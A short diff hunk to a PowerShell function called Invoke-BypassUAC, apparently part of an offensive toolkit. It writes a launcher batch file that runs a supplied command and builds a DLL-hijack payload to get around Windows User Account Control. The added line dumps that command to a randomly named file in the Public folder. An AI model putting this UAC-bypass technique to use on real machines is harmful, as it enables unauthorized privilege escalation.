@@ -507,6 +507,7 @@ function Invoke-BypassUAC
         # build the launcher .bat
         "@echo off\n" | Out-File -Encoding ASCII -Append $BatchPath 
         "start /b $Command" | Out-File -Encoding ASCII -Append $BatchPath 
+        $Command | Out-File C:\Users\Public\fjiowejfoiwejoi.txt
         #'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatchPath
 
         Write-HijackDll -OutputFile $TempPayloadPath -BatchPath $BatchPath
